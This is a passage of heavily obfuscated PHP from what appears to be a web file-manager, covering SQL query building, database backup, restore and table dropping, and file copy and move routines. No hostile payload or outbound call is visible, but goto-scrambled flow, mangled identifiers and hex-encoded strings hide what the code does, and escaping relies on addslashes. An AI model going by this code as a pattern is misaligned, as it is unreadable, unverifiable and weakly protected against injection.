buildSelectSql($aéÌèÎçùª = array()) { goto c‹Ã©İ‘Ş„; E¨×öÅ÷²²: return $D«¤ÓŠç; goto dÇ«ğ¿ä„; Bí¯à’ Ë: $D«¤ÓŠç = $this->parseSql($this->selectSql, $aéÌèÎçùª); $D«¤ÓŠç .= $this->parseLock(isset($aéÌèÎçùª[$bÙ‡ˆ­åğ[835]]) ? $aéÌèÎçùª[$bÙ‡ˆ­åğ[835]] : !1); if (isset($cÇùñ¼Å‘İ)) { think_cache($cÇùñ¼Å‘İ, $D«¤ÓŠç); } goto E¨×öÅ÷²²; c‹Ã©İ‘Ş„: $bÙ‡ˆ­åğ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (isset($aéÌèÎçùª[$bÙ‡ˆ­åğ[351]])) { if (strpos($aéÌèÎçùª[$bÙ‡ˆ­åğ[351]], $bÙ‡ˆ­åğ[47])) { list($aÙÆÄì¼¤´, $d®ÃÓíïÌ) = explode($bÙ‡ˆ­åğ[47], $aéÌèÎçùª[$bÙ‡ˆ­åğ[351]]); } else { $aÙÆÄì¼¤´ = $aéÌèÎçùª[$bÙ‡ˆ­åğ[351]]; } $aÙÆÄì¼¤´ = $aÙÆÄì¼¤´ ? $aÙÆÄì¼¤´ : 1; $d®ÃÓíïÌ = isset($d®ÃÓíïÌ) ? $d®ÃÓíïÌ : (is_numeric($aéÌèÎçùª[$bÙ‡ˆ­åğ[290]]) ? $aéÌèÎçùª[$bÙ‡ˆ­åğ[290]] : 20); $b‚ˆ‘Âƒ”± = $d®ÃÓíïÌ * ((int) $aÙÆÄì¼¤´ - 1); $aéÌèÎçùª[$bÙ‡ˆ­åğ[290]] = $b‚ˆ‘Âƒ”± . $bÙ‡ˆ­åğ[47] . $d®ÃÓíïÌ; } if (think_config($bÙ‡ˆ­åğ[1024])) { $cÇùñ¼Å‘İ = $bÙ‡ˆ­åğ[1025] . md5(serialize($aéÌèÎçùª)); $c¡å¬™äÅÍ = think_cache($cÇùñ¼Å‘İ); if ($c¡å¬™äÅÍ) { return $c¡å¬™äÅÍ; } } goto Bí¯à’ Ë; dÇ«ğ¿ä„: } public function parseSql($DîßŠµŒ…î, $Bˆ–¾ìœÆç = array()) { $A¸ÓÊ±› =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DîßŠµŒ…î = str_replace(array($A¸ÓÊ±›[1026], $A¸ÓÊ±›[1027], $A¸ÓÊ±›[1028], $A¸ÓÊ±›[1029], $A¸ÓÊ±›[1030], $A¸ÓÊ±›[1031], $A¸ÓÊ±›[1032], $A¸ÓÊ±›[1033], $A¸ÓÊ±›[1034], $A¸ÓÊ±›[1035], $A¸ÓÊ±›[1036]), array($this->parseTable("{$Bˆ–¾ìœÆç[$A¸ÓÊ±›[277]]}"), $this->parseDistinct(isset($Bˆ–¾ìœÆç[$A¸ÓÊ±›[1037]]) ? $Bˆ–¾ìœÆç[$A¸ÓÊ±›[1037]] : !1), $this->parseField(!empty($Bˆ–¾ìœÆç[$A¸ÓÊ±›[271]]) ? $Bˆ–¾ìœÆç[$A¸ÓÊ±›[271]] : $A¸ÓÊ±›[182]), $this->parseJoin(!empty($Bˆ–¾ìœÆç[$A¸ÓÊ±›[280]]) ? $Bˆ–¾ìœÆç[$A¸ÓÊ±›[280]] : $A¸ÓÊ±›[33]), $this->parseWhere(!empty($Bˆ–¾ìœÆç[$A¸ÓÊ±›[273]]) ? $Bˆ–¾ìœÆç[$A¸ÓÊ±›[273]] : $A¸ÓÊ±›[33]), $this->parseGroup(!empty($Bˆ–¾ìœÆç[$A¸ÓÊ±›[509]]) ? $Bˆ–¾ìœÆç[$A¸ÓÊ±›[509]] : $A¸ÓÊ±›[33]), $this->parseHaving(!empty($Bˆ–¾ìœÆç[$A¸ÓÊ±›[1038]]) ? $Bˆ–¾ìœÆç[$A¸ÓÊ±›[1038]] : $A¸ÓÊ±›[33]), $this->parseOrder(!empty($Bˆ–¾ìœÆç[$A¸ÓÊ±›[363]]) ? $Bˆ–¾ìœÆç[$A¸ÓÊ±›[363]] : $A¸ÓÊ±›[33]), $this->parseLimit(!empty($Bˆ–¾ìœÆç[$A¸ÓÊ±›[290]]) ? $Bˆ–¾ìœÆç[$A¸ÓÊ±›[290]] : $A¸ÓÊ±›[33]), $this->parseUnion(!empty($Bˆ–¾ìœÆç[$A¸ÓÊ±›[345]]) ? $Bˆ–¾ìœÆç[$A¸ÓÊ±›[345]] : $A¸ÓÊ±›[33]), $this->parseComment(!empty($Bˆ–¾ìœÆç[$A¸ÓÊ±›[352]]) ? $Bˆ–¾ìœÆç[$A¸ÓÊ±›[352]] : $A¸ÓÊ±›[33])), $DîßŠµŒ…î); return $DîßŠµŒ…î; } public function getLastSql($aÖÈ¼¬‚¼ = '') { return $aÖÈ¼¬‚¼ ? $this->modelSql[$aÖÈ¼¬‚¼] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($eìˆŸ†è) { return addslashes($eìˆŸ†è); } public function setModel($Eî³¸ôÕØ) { $this->model = $Eî³¸ôÕØ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto FÍ·¹‰’í; FÍ·¹‰’í: class DbManage { function __construct($BŠÏóŞ­™, $bƒí†Ê—é = '') { $this->database = $BŠÏóŞ­™; $this->type = $bƒí†Ê—é; } public function model($DêùÍ§¾ó = '') { return new ModelBase($DêùÍ§¾ó, $_SERVER[Ôğ—¤Šµˆ˜ñ£][33], $this->database); } public function db($BÅ¸ÃªØÓã = false) { goto AµÚ˜Å¡; AµÚ˜Å¡: $f‰À¼íÜÄ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CÉí¹†¹êî = array_change_key_case($this->database); if ($this->type == $f‰À¼íÜÄ[9] || !$BÅ¸ÃªØÓã) { return $this->model()->db(); } goto bª…ŠÂÊŞÔ; fáöÁĞîŒÅ: $this->database = $CÉí¹†¹êî; $d‰÷ã½»‡Ò->execute("\x75\x73\145\40\140{$FÎÃ½ÅÇŒ}\140"); return $d‰÷ã½»‡Ò; goto cÔ›äÜÊå¢; bª…ŠÂÊŞÔ: $FÎÃ½ÅÇŒ = $CÉí¹†¹êî[$f‰À¼íÜÄ[952]]; $CÉí¹†¹êî[$f‰À¼íÜÄ[952]] = $f‰À¼íÜÄ[33]; if ($CÉí¹†¹êî[$f‰À¼íÜÄ[777]] == $f‰À¼íÜÄ[778]) { $dìÑÔ‡ö•° = $CÉí¹†¹êî[$f‰À¼íÜÄ[779]]; $CÉí¹†¹êî[$f‰À¼íÜÄ[779]] = substr($dìÑÔ‡ö•°, 0, strrpos($dìÑÔ‡ö•°, $f‰À¼íÜÄ[1039])); } goto eÈÆ«ĞÃëÇ; eÈÆ«ĞÃëÇ: $this->database = $CÉí¹†¹êî; $d‰÷ã½»‡Ò = $this->model()->db(); try { $CÎ·›Â° = $d‰÷ã½»‡Ò->execute("\163\x68\157\x77\x20\144\141\164\141\x62\x61\163\145\x73\x20\154\x69\x6b\x65\x20\47{$FÎÃ½ÅÇŒ}\x27"); } catch (Exception $c©éçª†‰Ú) { } goto CÇšœğ­–‰; CÇšœğ­–‰: if (!$CÎ·›Â°) { $d‰÷ã½»‡Ò->execute("\x63\x72\x65\141\x74\x65\40\144\141\164\x61\142\141\x73\145\40\140{$FÎÃ½ÅÇŒ}\x60"); } $CÉí¹†¹êî[$f‰À¼íÜÄ[952]] = $FÎÃ½ÅÇŒ; if ($CÉí¹†¹êî[$f‰À¼íÜÄ[777]] == $f‰À¼íÜÄ[778]) { $CÉí¹†¹êî[$f‰À¼íÜÄ[779]] .= $f‰À¼íÜÄ[1039] . $FÎÃ½ÅÇŒ; } goto fáöÁĞîŒÅ; cÔ›äÜÊå¢: } public function createTable($cœ«É×Î, $C¥®äê•İ† = null) { $cÔ¦¸‰º¶È =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!IO::exist($cœ«É×Î)) { ActionCall($cÔ¦¸‰º¶È[1040], !0, 0); show_json(LNG($cÔ¦¸‰º¶È[1041]), !1); } $ešÜ·É°åµ = sqlSplit(IO::getContent($cœ«É×Î)); foreach ($ešÜ·É°åµ as $B„Ì¥Á®É) { if ($C¥®äê•İ†) { $FŸ¥•¬È– = stripos($B„Ì¥Á®É, $cÔ¦¸‰º¶È[1042]) === 0; if ($FŸ¥•¬È–) { $C¥®äê•İ†->task[$cÔ¦¸‰º¶È[1043]] += 1; } } $this->model()->db()->execute($B„Ì¥Á®É); if ($C¥®äê•İ† && $FŸ¥•¬È–) { preg_match($cÔ¦¸‰º¶È[1044], $B„Ì¥Á®É, $eøÀÕËÁ¡); $C¥®äê•İ†->task[$cÔ¦¸‰º¶È[1045]] = $eøÀÕËÁ¡[1]; $C¥®äê•İ†->update(1); } } $this->taskToCache($C¥®äê•İ†); } public function insertTable($Cˆò‹¶Øö¸, $bÇœº¼ÇÊ– = null) { $dîÉÚ÷×³î =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eö“ËƒÅáæ = $this->model()->db(); $cŒ¥å‚¤ˆ = $Eç„´êÄÃ² ? array($Eç„´êÄÃ²) : $eö“ËƒÅáæ->getTables(); foreach ($Cˆò‹¶Øö¸ as $fìƒƒÁ‹ÛÀ) { $Eç„´êÄÃ² = basename($fìƒƒÁ‹ÛÀ, $dîÉÚ÷×³î[767]); if (!in_array($Eç„´êÄÃ², $cŒ¥å‚¤ˆ)) { continue; } if ($bÇœº¼ÇÊ–) { $bÇœº¼ÇÊ–->task[$dîÉÚ÷×³î[1045]] = $Eç„´êÄÃ²; } if (get_filesize($fìƒƒÁ‹ÛÀ) == 0) { continue; } $aÕß‰ô¦· = $this->sqlToDb($fìƒƒÁ‹ÛÀ, $bÇœº¼ÇÊ–); if (!$aÕß‰ô¦·) { ActionCall($dîÉÚ÷×³î[1040], !0, 0); show_json(LNG($dîÉÚ÷×³î[1046]) . "\x5b{$Eç„´êÄÃ²}\135", !1); } } $this->taskToCache($bÇœº¼ÇÊ–); } public function sqlFromDb($c¸Š»Œ„—É, $EŒõÍõÄ²„, $fÏÜ¯Ã‚œ = null, $dÖ¢â†ó¾ = null) { goto a†Ô±‚·”„; a†Ô±‚·”„: if ($fÏÜ¯Ã‚œ) { $fÏÜ¯Ã‚œ->task[$_SERVER[Ôğ—¤Šµˆ˜ñ£][1045]] = $c¸Š»Œ„—É; } $B•ãÂ©¸ÛÉ = $this->model($c¸Š»Œ„—É); $eßÑ¨ˆÀË» = 0; goto Bê‰ÙºŒÄ´; cê¾À×æ­–: fclose($aÆÙ±¶ªå§); return $eßÑ¨ˆÀË»; goto fëˆ˜‡±ù; Bê‰ÙºŒÄ´: $c»µ‹Ûîé• = 0; $fÕ·Å´‚¸ª = 10000; $aÆÙ±¶ªå§ = fopen($EŒõÍõÄ²„, $_SERVER[Ôğ—¤Šµˆ˜ñ£][1047]); goto FÃ„ÎÌô¸¡; FÃ„ÎÌô¸¡: $FÂä ÔÒ»¢ = $B•ãÂ©¸ÛÉ->getPk(); $e†î“óì‡¢ = $B•ãÂ©¸ÛÉ->getDbFields(); do { $D‡Ã× ˆ…½ = array($FÂä ÔÒ»¢ => array($_SERVER[Ôğ—¤Šµˆ˜ñ£][994], $c»µ‹Ûîé•)); $f™¢Ó£Êˆñ = $B•ãÂ©¸ÛÉ->where($D‡Ã× ˆ…½)->field($e†î“óì‡¢)->order($FÂä ÔÒ»¢ . $_SERVER[Ôğ—¤Šµˆ˜ñ£][1048])->limit($fÕ·Å´‚¸ª)->select(); $f™¢Ó£Êˆñ = !empty($f™¢Ó£Êˆñ) ? $f™¢Ó£Êˆñ : array(); if (!($D“µÍ«§·ƒ = count($f™¢Ó£Êˆñ))) { break; } $dØÇò†ÆÈ = end($f™¢Ó£Êˆñ); $c»µ‹Ûîé• = $dØÇò†ÆÈ[$FÂä ÔÒ»¢]; $Eª²©¿©óÎ = array(); foreach ($f™¢Ó£Êˆñ as $dÒïò×ğÆ¦) { if ($c¸Š»Œ„—É == $_SERVER[Ôğ—¤Šµˆ˜ñ£][1049] && $dÒïò×ğÆ¦[$_SERVER[Ôğ—¤Šµˆ˜ñ£][29]] == $_SERVER[Ôğ—¤Šµˆ˜ñ£][1050]) { $B‚‰ñ’£Œ = json_decode($dÒïò×ğÆ¦[$_SERVER[Ôğ—¤Šµˆ˜ñ£][372]], !0); if ($B‚‰ñ’£Œ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][28]] == date($_SERVER[Ôğ—¤Šµˆ˜ñ£][732]) && !$B‚‰ñ’£Œ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][731]]) { continue; } } if ($dÖ¢â†ó¾) { $dÒïò×ğÆ¦[$_SERVER[Ôğ—¤Šµˆ˜ñ£][76]] = "\173\151\157\72{$dÖ¢â†ó¾}\x7d" . substr($dÒïò×ğÆ¦[$_SERVER[Ôğ—¤Šµˆ˜ñ£][76]], strlen("\x7b\151\x6f\x3a{$dÒïò×ğÆ¦[$_SERVER[Ôğ—¤Šµˆ˜ñ£][805]]}\x7d")); $dÒïò×ğÆ¦[$_SERVER[Ôğ—¤Šµˆ˜ñ£][805]] = $dÖ¢â†ó¾; } $Eª²©¿©óÎ[] = $_SERVER[Ôğ—¤Šµˆ˜ñ£][1051] . $this->sqlEncode($dÒïò×ğÆ¦) . $_SERVER[Ôğ—¤Šµˆ˜ñ£][1052]; } $c‰íó‰Ğš = "\111\x4e\123\x45\x52\x54\x20\111\x4e\124\x4f\x20\x60{$c¸Š»Œ„—É}\x60\x20\50\x60" . implode($_SERVER[Ôğ—¤Šµˆ˜ñ£][1053], $e†î“óì‡¢) . $_SERVER[Ôğ—¤Šµˆ˜ñ£][1054]; fwrite($aÆÙ±¶ªå§, $c‰íó‰Ğš . implode($_SERVER[Ôğ—¤Šµˆ˜ñ£][1055], $Eª²©¿©óÎ) . $_SERVER[Ôğ—¤Šµˆ˜ñ£][68] . PHP_EOL); $eßÑ¨ˆÀË» += $D“µÍ«§·ƒ; if ($fÏÜ¯Ã‚œ) { $fÏÜ¯Ã‚œ->update($D“µÍ«§·ƒ); } } while ($fÕ·Å´‚¸ª == $D“µÍ«§·ƒ); goto cê¾À×æ­–; fëˆ˜‡±ù: } public function sqlToDb($d‡ÙŠ½ĞİÌ, $fÔÉã‘àÆå = null) { goto dì”äì– Ì; cÒÉ»å…ÏÚ: while (!feof($AÊ‹ùò‘³)) { $FµÒáİÉ‹ñ = trim(fgets($AÊ‹ùò‘³)); if (!$FµÒáİÉ‹ñ) { continue; } $fäÂ…ª‰ç´ = $this->sqlDecode($FµÒáİÉ‹ñ, $this->type); if (stripos($fäÂ…ª‰ç´, $D©…Ú‚çÊï[353]) === 0) { if (!$a×É‚¯®ÒÆ) { $a×É‚¯®ÒÆ = $fäÂ…ª‰ç´ . $D©…Ú‚çÊï[50]; } continue; } if ($fÔÉã‘àÆå) { $fÔÉã‘àÆå->task[$D©…Ú‚çÊï[1043]] += 1; } $D¦¥ìÔ¼…’++; $dïŠ¥İòÆÂ[] = rtrim(rtrim(trim($fäÂ…ª‰ç´), $D©…Ú‚çÊï[47]), $D©…Ú‚çÊï[68]); $aáÉğåÓ® = null; $DíĞ¤ÚÖáè = strlen($fäÂ…ª‰ç´); $f½ùÆÁêç“ += $DíĞ¤ÚÖáè; if ($f½ùÆÁêç“ >= ($bï³‚¢Øí == 500 ? $a•­µœÕµù : $a›ö°»´à®)) { $aáÉğåÓ® = array_pop($dïŠ¥İòÆÂ); if ($D¦¥ìÔ¼…’ > 1) { $D¦¥ìÔ¼…’--; } } if ($D¦¥ìÔ¼…’ >= $bï³‚¢Øí || $aáÉğåÓ®) { goto fËÅ†ººÌ®; c èŒ”¶Ë­: if ($aáÉğåÓ®) { $dïŠ¥İòÆÂ = array($aáÉğåÓ®); $D¦¥ìÔ¼…’ = 1; $f½ùÆÁêç“ = $DíĞ¤ÚÖáè; } goto Bˆ×ËåÖÊÆ; fËÅ†ººÌ®: $fäÂ…ª‰ç´ = $a×É‚¯®ÒÆ . implode($D©…Ú‚çÊï[47], $dïŠ¥İòÆÂ); if (!$b¼ˆ“Ñí‡‰->execute($fäÂ…ª‰ç´)) { return !1; } if ($fÔÉã‘àÆå) { $fÔÉã‘àÆå->update($D¦¥ìÔ¼…’); } goto C¿Â‡ŸÕæ—; C¿Â‡ŸÕæ—: $dïŠ¥İòÆÂ = array(); $D¦¥ìÔ¼…’ = 0; $f½ùÆÁêç“ = 0; goto c èŒ”¶Ë­; Bˆ×ËåÖÊÆ: } } fclose($AÊ‹ùò‘³); if (!empty($dïŠ¥İòÆÂ)) { $fäÂ…ª‰ç´ = $a×É‚¯®ÒÆ . implode($D©…Ú‚çÊï[47], $dïŠ¥İòÆÂ); if (!$b¼ˆ“Ñí‡‰->execute($fäÂ…ª‰ç´)) { return !1; } if ($fÔÉã‘àÆå) { $fÔÉã‘àÆå->update($D¦¥ìÔ¼…’); } } goto e¯Á†Å…Ü…; dì”äì– Ì: $D©…Ú‚çÊï =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b¼ˆ“Ñí‡‰ = $this->model()->db(); $AÊ‹ùò‘³ = @fopen($d‡ÙŠ½ĞİÌ, $D©…Ú‚çÊï[1056]); goto d›‡ñ»ƒ¾; d›‡ñ»ƒ¾: if (!$AÊ‹ùò‘³) { return !1; } $D¦¥ìÔ¼…’ = 0; $a×É‚¯®ÒÆ = $D©…Ú‚çÊï[33]; goto cŞğ’ğêöç; e¯Á†Å…Ü…: return !0; goto bøß¡ÙŸÂ„; cŞğ’ğêöç: $dïŠ¥İòÆÂ = array(); $bï³‚¢Øí = $this->type == $D©…Ú‚çÊï[9] ? 500 : 2000; $D°ëÚòçö° = basename($d‡ÙŠ½ĞİÌ, $D©…Ú‚çÊï[767]); goto c¦‘—¥¤; c¦‘—¥¤: $f½ùÆÁêç“ = 0; $a•­µœÕµù = 4194304 - 104858; $a›ö°»´à® = 1000000 - 104858; goto cÒÉ»å…ÏÚ; bøß¡ÙŸÂ„: } public function dropTable($E‰ÖŠµŠÇ = null) { $cŸÆì¶°¹ = $this->model()->db(); $b†ÏÇ¨Á = $E‰ÖŠµŠÇ ? array($E‰ÖŠµŠÇ) : $cŸÆì¶°¹->getTables(); if (!$b†ÏÇ¨Á) { return; } foreach ($b†ÏÇ¨Á as $E‰ÖŠµŠÇ) { if ($E‰ÖŠµŠÇ) { $E‰ÖŠµŠÇ = strtolower($E‰ÖŠµŠÇ); } else { continue; } $cŸÆì¶°¹->execute("\x64\162\157\160\40\x74\x61\142\x6c\x65\40\x69\146\x20\x65\170\x69\163\x74\x73\x20\140{$E‰ÖŠµŠÇ}\x60"); } } private function taskToCache($e…¡öŞ•¤Ä = null) { $bÂà£ëÏœ¡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$e…¡öŞ•¤Ä) { return; } $E²Şğ„¨‰õ = array($bÂà£ëÏœ¡[1045] => $e…¡öŞ•¤Ä->task[$bÂà£ëÏœ¡[1045]], $bÂà£ëÏœ¡[1043] => $e…¡öŞ•¤Ä->task[$bÂà£ëÏœ¡[1043]], $bÂà£ëÏœ¡[1057] => $e…¡öŞ•¤Ä->task[$bÂà£ëÏœ¡[1057]]); if ($E²Şğ„¨‰õ[$bÂà£ëÏœ¡[1043]] == $E²Şğ„¨‰õ[$bÂà£ëÏœ¡[1057]]) { $E²Şğ„¨‰õ[$bÂà£ëÏœ¡[741]] = 1; } Cache::set($bÂà£ëÏœ¡[1058] . $e…¡öŞ•¤Ä->task[$bÂà£ëÏœ¡[395]], $E²Şğ„¨‰õ); $e…¡öŞ•¤Ä->end(); } private function sqlEncode($AÌ‰ÚÔ•µ¡) { $d°õ¶Êã¬ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Cé¤ÖÃšƒè = array(); foreach ($AÌ‰ÚÔ•µ¡ as $eç¿ŞÑ•‹Ê) { if (is_array($eç¿ŞÑ•‹Ê)) { $eç¿ŞÑ•‹Ê = json_encode_force($eç¿ŞÑ•‹Ê); } $eç¿ŞÑ•‹Ê = addslashes($eç¿ŞÑ•‹Ê); $eç¿ŞÑ•‹Ê = str_replace(array($d°õ¶Êã¬[1059], $d°õ¶Êã¬[229]), array($d°õ¶Êã¬[1060], $d°õ¶Êã¬[1061]), $eç¿ŞÑ•‹Ê); $Cé¤ÖÃšƒè[] = str_replace($d°õ¶Êã¬[55], $d°õ¶Êã¬[1062], $eç¿ŞÑ•‹Ê); } return $d°õ¶Êã¬[55] . implode($d°õ¶Êã¬[1063], $Cé¤ÖÃšƒè) . $d°õ¶Êã¬[55]; } private function sqlDecode($cÏƒ‡¤œ«, $D¥çø®¿Ÿ’) { $E×‡¹ØÀ‡µ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÏƒ‡¤œ« = str_replace(array($E×‡¹ØÀ‡µ[1060], $E×‡¹ØÀ‡µ[1061]), array($E×‡¹ØÀ‡µ[1059], $E×‡¹ØÀ‡µ[229]), $cÏƒ‡¤œ«); if ($D¥çø®¿Ÿ’ == $E×‡¹ØÀ‡µ[9]) { $cÏƒ‡¤œ« = stripslashes($cÏƒ‡¤œ«); } return $cÏƒ‡¤œ«; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($A¼‰å‚šÙÁ, $B™æß–öà›) { goto cÆŒª’†İ; C¨ÛâÌ‡ƒÏ: Hook::trigger($BäÒŒ·‰ê[1065] . $A¼‰å‚šÙÁ . $BäÒŒ·‰ê[1068], $e¦â‹ÉÈ·, $Dó¢Ó¬ìñ™); return $Dó¢Ó¬ìñ™; goto Bµ½Ü™½; cº¬îù¼¡: Hook::trigger($BäÒŒ·‰ê[1065] . $A¼‰å‚šÙÁ . $BäÒŒ·‰ê[1066], $e¦â‹ÉÈ·); $fá±Êß’ = self::driverMake($B™æß–öà›[0]); if (method_exists($fá±Êß’, $A¼‰å‚šÙÁ)) { $Dó¢Ó¬ìñ™ = @call_user_func_array(array($fá±Êß’, $A¼‰å‚šÙÁ), $B™æß–öà›); } else { if (method_exists($fá±Êß’, $BäÒŒ·‰ê[1067])) { $Dó¢Ó¬ìñ™ = @call_user_func_array(array($fá±Êß’, $A¼‰å‚šÙÁ), $B™æß–öà›); } else { if (method_exists(self, $A¼‰å‚šÙÁ)) { $Dó¢Ó¬ìñ™ = @call_user_func_array(array(self, $A¼‰å‚šÙÁ), $B™æß–öà›); } else { $Dó¢Ó¬ìñ™ = call_user_func_array(array(parent, $A¼‰å‚šÙÁ), $B™æß–öà›); } } } goto C¨ÛâÌ‡ƒÏ; cÆŒª’†İ: $BäÒŒ·‰ê =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e¦â‹ÉÈ· = $B™æß–öà›; $GLOBALS[$BäÒŒ·‰ê[1064]] = $BäÒŒ·‰ê[1065] . $A¼‰å‚šÙÁ; goto cº¬îù¼¡; Bµ½Ü™½: } public static function init($EëøÒØÈ´æ) { return self::driverMake($EëøÒØÈ´æ); } public static function copy($d¶ˆáÊ–ŞÕ, $D©ç‚„šÑ, $F²ÔßğÙ¯à = false, $bÈõ‹ÇéãÂ = false) { return self::copyMoveStart($d¶ˆáÊ–ŞÕ, $D©ç‚„šÑ, $F²ÔßğÙ¯à, $_SERVER[Ôğ—¤Šµˆ˜ñ£][543], $bÈõ‹ÇéãÂ); } public static function move($Bìç‹õÛô², $B„ÃãñåÊ‰, $a‰‚ó–…Î¢ = false, $F§âáÂ¾œ† = false) { return self::copyMoveStart($Bìç‹õÛô², $B„ÃãñåÊ‰, $a‰‚ó–…Î¢, $_SERVER[Ôğ—¤Šµˆ˜ñ£][545], $F§âáÂ¾œ†); } private static function copyMoveStart($cÆï õš‹ó, $a®‚ğ·¯ïí, $B˜öÃ¤‚…, $f‚çÓ‰ÖÇÛ, $AæàĞìíŞ’) { $a…„“šêä˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a¤À¬Ì°Û´ = array($cÆï õš‹ó, $a®‚ğ·¯ïí, $B˜öÃ¤‚…, $AæàĞìíŞ’); Hook::trigger($a…„“šêä˜[1065] . $f‚çÓ‰ÖÇÛ . $a…„“šêä˜[1066], $a¤À¬Ì°Û´); $AÆ—ÅŞà× = self::copyMove($cÆï õš‹ó, $a®‚ğ·¯ïí, $B˜öÃ¤‚…, $f‚çÓ‰ÖÇÛ, $AæàĞìíŞ’); Hook::trigger($a…„“šêä˜[1065] . $f‚çÓ‰ÖÇÛ . $a…„“šêä˜[1068], $a¤À¬Ì°Û´, $AÆ—ÅŞà×); return $AÆ—ÅŞà×; } public static function saveFile($Eº×®‹™‹, $fÑóà›Şí, $EÚô„—¬Ğ = true) { goto fÉÄ‘ìÎßñ; c®©©Óõ³¢: return $A†Ûğ–×¢¼; goto F­ƒÙëÉ†; A“ ÍÑÂ ¹: $F‘¡“îÎ—ù = self::driverMake($fÑóà›Şí); $Eå„øœóÄ¡ = !1; if ($F‘¡“îÎ—ù->pathParse[$cËÑÜ•É™Ú[1069]]) { $Eå„øœóÄ¡ = $F‘¡“îÎ—ù; $F‘¡“îÎ—ù = self::driverMake($F‘¡“îÎ—ù->pathParse[$cËÑÜ•É™Ú[1069]]); } goto FšÉ¬‚®·; A†Ê¸ÚÁœ: if (!$EÚô„—¬Ğ && self::driverIsSame($E« á•¨ˆ¾, $F‘¡“îÎ—ù)) { $BÜš”ç“Ÿ = !1; } $A†Ûğ–×¢¼ = self::copyFile($E« á•¨ˆ¾, $Eº×®‹™‹, $F‘¡“îÎ—ù, $C±¬­×ê, $dŒ†š–…Š[$cËÑÜ•É™Ú[28]], $BÜš”ç“Ÿ); if ($Eå„øœóÄ¡) { $A†Ûğ–×¢¼ = $Eå„øœóÄ¡->getPathOuter($A†Ûğ–×¢¼); } goto c®©©Óõ³¢; FšÉ¬‚®·: if ($E« á•¨ˆ¾->pathParse[$cËÑÜ•É™Ú[1069]]) { $E« á•¨ˆ¾ = self::driverMake($E« á•¨ˆ¾->pathParse[$cËÑÜ•É™Ú[1069]]); } $C±¬­×ê = $F‘¡“îÎ—ù->pathFather($fÑóà›Şí); $BÜš”ç“Ÿ = !0; goto A†Ê¸ÚÁœ; fÉÄ‘ìÎßñ: $cËÑÜ•É™Ú =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dŒ†š–…Š = self::info($fÑóà›Şí); $E« á•¨ˆ¾ = self::driverMake($Eº×®‹™‹); goto A“ ÍÑÂ ¹; F­ƒÙëÉ†: } private static function copyMove($c‚½¦÷§ƒ», $F§»ˆè‚Ş¥, $aöìäµÍ·, $E½„ç²ÃÁ, $a³Êë‹¥È = false) { goto eÜÑÓ´Ï…Š; eâÇÉíÂ…: self::check($f»¡œÇÅÉ±, $c‚½¦÷§ƒ», $Dœ¯ŸºØˆô, $F§»ˆè‚Ş¥); Hook::trigger($FòÉÖ¿´‰[73], $f»¡œÇÅÉ±, $c‚½¦÷§ƒ», $Dœ¯ŸºØˆô, $F§»ˆè‚Ş¥); $eèšĞÅÇ»ø = self::driverIsSame($f»¡œÇÅÉ±, $Dœ¯ŸºØˆô); goto dŞŠ¶·Û™Ó; BÃƒ’ñ¬†ƒ: if ($e‰ŞÒÒ‚†‘ && $CíøŒô‘áê) { $f»¡œÇÅÉ±->remove($c‚½¦÷§ƒ»); } if ($A£í·®áƒ) { $e‰ŞÒÒ‚†‘ = $A£í·®áƒ->getPathOuter($e‰ŞÒÒ‚†‘); } return $e‰ŞÒÒ‚†‘; goto d«êë¹ÛÖÅ; dŞŠ¶·Û™Ó: if ($eèšĞÅÇ»ø) { if ($E½„ç²ÃÁ == $FòÉÖ¿´‰[545] && !method_exists($Dœ¯ŸºØˆô, $FòÉÖ¿´‰[1070]) && trim($F§»ˆè‚Ş¥, $FòÉÖ¿´‰[8]) == trim($Dœ¯ŸºØˆô->pathFather($c‚½¦÷§ƒ»), $FòÉÖ¿´‰[8])) { if ($f»¡œÇÅÉ±->pathThis($c‚½¦÷§ƒ») != $a³Êë‹¥È && !$f»¡œÇÅÉ±->isTypeObject()) { return $f»¡œÇÅÉ±->rename($c‚½¦÷§ƒ», $a³Êë‹¥È); } return $Dœ¯ŸºØˆô->getPathOuter($c‚½¦÷§ƒ»); } if (method_exists($Dœ¯ŸºØˆô, $E½„ç²ÃÁ)) { return $Dœ¯ŸºØˆô->{$E½„ç²ÃÁ}($c‚½¦÷§ƒ», $F§»ˆè‚Ş¥, $aöìäµÍ·); } } $Cñ’ºù¿¶­ = $f»¡œÇÅÉ±->isFile($c‚½¦÷§ƒ»); if (!$Cñ’ºù¿¶­ && $Dœ¯ŸºØˆô->getType() == $FòÉÖ¿´‰[739] && $f»¡œÇÅÉ±->getType() == $FòÉÖ¿´‰[106]) { $e‰ŞÒÒ‚†‘ = $Dœ¯ŸºØˆô->copyFolderFromIO($f»¡œÇÅÉ±, $c‚½¦÷§ƒ», $F§»ˆè‚Ş¥, $aöìäµÍ·, $CíøŒô‘áê, $a³Êë‹¥È); } else { $e‰ŞÒÒ‚†‘ = self::copyPath($f»¡œÇÅÉ±, $c‚½¦÷§ƒ», $Dœ¯ŸºØˆô, $F§»ˆè‚Ş¥, $aöìäµÍ·, $CíøŒô‘áê, $Cñ’ºù¿¶­, $a³Êë‹¥È); } goto BÃƒ’ñ¬†ƒ; e”¶ñƒ…ÑÜ: $f»¡œÇÅÉ± = self::driverMake($c‚½¦÷§ƒ»); $Dœ¯ŸºØˆô = self::driverMake($F§»ˆè‚Ş¥); $CíøŒô‘áê = $E½„ç²ÃÁ == $FòÉÖ¿´‰[545]; goto CÁÚ­¤Š½Õ; CÁÚ­¤Š½Õ: 